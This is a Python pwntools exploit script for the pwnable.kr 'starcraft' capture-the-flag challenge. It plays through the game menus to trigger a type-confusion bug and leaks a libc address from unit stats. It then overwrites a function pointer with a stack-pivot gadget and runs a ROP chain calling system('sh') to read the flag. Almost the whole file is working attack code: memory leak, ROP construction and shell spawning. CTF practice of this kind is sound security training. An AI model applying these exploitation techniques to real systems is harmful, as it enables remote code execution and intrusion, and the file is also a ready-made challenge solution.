#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user starcraft --path ./starcraft
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'starcraft')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'starcraft'
password = args.PASSWORD or 'guest'
remote_path = './starcraft'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)
    shell.upload_file("nosleep.so")

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env={b"LD_PRELOAD": b"./nosleep.so"}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={b"LD_PRELOAD": b"./nosleep.so"}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        # return shell.process([remote_path] + argv, env={b"LD_PRELOAD": b"./nosleep.so"}, *a, **kw)
        return remote("pwnable.kr", 9020)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set ida-enabled on
b *$ida("do_artwork")
b *$ida("do_protoss_attack")+0xc8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

if args.LOCAL:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    stack_offset = 0x118
    gadget_offset = 0x0000000000042946
else:
    libc = ELF("./libc-2.23.so")
    stack_offset = 0x108
    gadget_offset = 0x00000000000359ec

import enum

class Unit(enum.IntEnum):
    Marin = 1
    Firebat = 2
    Ghost = 3
    Zealot = 4
    Draon = 5
    Templar = 6
    Zergling = 7
    Hydralisk = 8
    Ultralisk = 9

class TemplarAttack(enum.IntEnum):
    default = 0
    arcon_warp = 1
    hallucination = 2 
    psionic_strom = 3

class Starcraft:
    DEATH_STRING = b"wanna cheat\.\.\.\?"
    WANNA_CHEAT_STRING = b"wanna cheat\?"
    SELECT_ATTACK_STRING = b"select attack option"
    STAGE_START = b"Stage (\d+) start"
    SELECT_UNIT = b"select your unit"
    LIBC_LEAK_1 = b"   is burrowed : (-?\d+)\n"
    LIBC_LEAK_2 = b"   is burrow-able\? : (-?\d+)\n"
    INPUT_ARTWORK = b"input unit ascii artwork"
    TRIGGERED = b"ha! its an exit trap\. no ROP for you :P"

    def __init__(self, io: tube) -> None:
        self.io = io

        self.handlers = {
            self.INPUT_ARTWORK: self.handle_artwork,
            self.DEATH_STRING: self.handle_death,
            self.WANNA_CHEAT_STRING: self.handle_cheat,
            self.LIBC_LEAK_1: self.handle_libc_leak_1,
            self.LIBC_LEAK_2: self.handle_libc_leak_2,
            self.SELECT_ATTACK_STRING: self.select_attack,
            self.STAGE_START: self.handle_stage_start,
            self.SELECT_UNIT: self.select_unit,
            self.TRIGGERED: self.handle_triggered,
        }

        self.stage = 0
        self.stage_progress = log.progress("current stage")

        self._leaked_libc_base = False
        self._expects_leak = False
        self._morphed = False

        self._libc_leak_1 = None
        self._libc_leak_2 = None

        self._ready_to_die = False
        self._trigger_artwork = False
        self._command = None

        self._done = False

    def handle_triggered(self, match: re.Match):
        io.sendline(b"echo AAAA; cat flag")
        io.recvuntil(b'AAAA\n')

        success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")

        self._done = True

    def handle_artwork(self, match: re.Match):
        # overwrite funcptr with a `add rsp, ...` which will move the stack to the cheat input (which we control - and will give us rop)
        self.io.sendline(flat({264: libc.address + gadget_offset}))

    def handle_libc_leak_1(self, match: re.Match):
        if not self._expects_leak:
            return

        self._libc_leak_1 = int(match.groups()[0])

    def handle_libc_leak_2(self, match: re.Match):
        if not self._expects_leak:
            return

        self._libc_leak_2 = int(match.groups()[0])

        exit_address = u64(p32(self._libc_leak_1, sign="signed") + p32(self._libc_leak_2, sign="signed"))

        info(f"leaked exit address: 0x{exit_address:x}")

        libc.address = exit_address - libc.sym["exit"]

        success(f"leaked libc address: 0x{libc.address:x}")

        self._expects_leak = False

        rop_ = ROP(libc, badchars=string.whitespace.encode())
        rop_.system(next(libc.search(b"sh\x00")))

        self._command = flat({stack_offset - 248: rop_.build()})

    def handle_cheat(self, match: re.Match):
        # place our rop on the stack for later use
        info("cheating!")
    
        io.sendline(self._command)

        self._ready_to_die = True
        
    def handle_stage_start(self, match: re.Match):
        # capture current stage report
        self.stage = int(match.groups()[0])
        self.stage_progress.status(self.stage)
        
        if self.stage == 12:
            self._trigger_artwork = True

    def handle_death(self, match: re.Match):
        # on death we trigger a call to the funcptr
        if not self._ready_to_die:
            raise Exception("died early...")

        self.io.sendline(b"1")  # trigger call

    def select_attack(self, match: re.Match):
        if not self._morphed:
            # first step is to morph as the typeconf is triggered on the morphed unit
            info("morphing...")
            self.io.sendline(str(TemplarAttack.arcon_warp.value).encode())
            self._morphed = True
        
        elif not self._leaked_libc_base:
            # second step is to call hallucination which will call the zerg dump on the morphed unit and will leak libc address
            # after this step we are expecting the libc leak prints.
            info("triggering dump... (libc leak)")
            self.io.sendline(str(TemplarAttack.hallucination.value).encode())  # TYPECONF
            self._expects_leak = True
            self._leaked_libc_base = True
        
        elif self._trigger_artwork:
            # final step is to call the artwork input. this can be done only after we reach stage 11. this lets us overwrite the funcptr
            self._trigger_artwork = False
            info("triggering artwork... (funcptr overwrite)")
            self.io.sendline(str(TemplarAttack.arcon_warp.value).encode())  # TYPECONF - input artwork
        
        else:
            self.io.sendline(str(TemplarAttack.default.value).encode())

    def select_unit(self, match: re.Match):
        # called on init only
        self.io.sendline(str(Unit.Templar.value).encode())

    def parse_single(self):
        combined_regex = b"|".join(self.handlers.keys())
        match = self.io.recvregex(combined_regex, capture=True)

        if match:
            for expr, handler in self.handlers.items():
                match_ = re.match(expr, match.group())
                if match_:
                    handler(match_)

    def run(self):
        while not self._done:
            self.parse_single()

context.terminal = ["kitty"]

io = start()
starcraft = Starcraft(io)
starcraft.run()
